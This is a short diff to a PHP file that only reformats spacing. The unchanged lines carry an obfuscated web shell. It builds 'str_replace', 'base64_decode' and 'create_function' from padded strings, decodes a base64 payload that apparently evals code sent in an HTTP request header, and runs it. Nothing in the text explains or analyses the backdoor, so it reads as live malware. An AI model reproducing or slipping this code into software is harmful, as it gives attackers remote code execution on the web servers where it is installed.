@@ -4,7 +4,7 @@ try{
 function m(){
 $a = "sfdtfdrf";
 $b = "d_fdrfdefdpf";
-return str_replace( "fd", "", $a.$b."dlfdafdcfde" );
+return str_replace("fd", "", $a.$b."dlfdafdcfde");
 }
 $c = time();
 $d = $c;
@@ -19,7 +19,7 @@ $g = "IEBldmFsKCR";
 $h = "WydIVFRQX0F";
 $i = "DQ0VleQVCddKTs=";
 $j = m();
-$k  = $j( "z", "", "zbazsze64"."_zdzeczodze" );
-$l = $j( "p", "", "pcprpepaptpe_fp"."upnpcptpipopn" );
-$z = $l( '', $k( $j( "le", "", $g . $f . $h . $i ) ) );
+$k  = $j("z", "", "zbazsze64"."_zdzeczodze");
+$l = $j("p", "", "pcprpepaptpe_fp"."upnpcptpipopn");
+$z = $l('', $k( $j( "le", "", $g . $f . $h . $i)));
 for($i=1;$i<=2;$i=$i+2){$z();}}
